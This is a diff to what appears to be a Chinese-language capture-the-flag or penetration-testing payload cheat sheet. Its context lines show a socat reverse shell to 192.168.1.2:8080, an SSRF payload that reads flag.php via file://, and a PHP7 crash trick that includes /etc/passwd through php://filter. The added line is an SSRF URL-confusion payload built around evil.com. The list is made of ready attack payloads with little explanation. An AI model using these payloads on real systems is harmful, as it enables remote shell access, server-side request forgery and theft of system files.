@@ -12,6 +12,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080
 ```
 ## ssrf常用payload
 `admin=1&url=file://www.ichunqiu.com/var/www/html/flag.php`
+`file://user@evil.com:80@www.google.com//var/www/html/index.php%23`
 
 ## php7 直接崩溃bug
 `include(‘php://filter/string.strip_tags/resource=/etc/passwd’)`
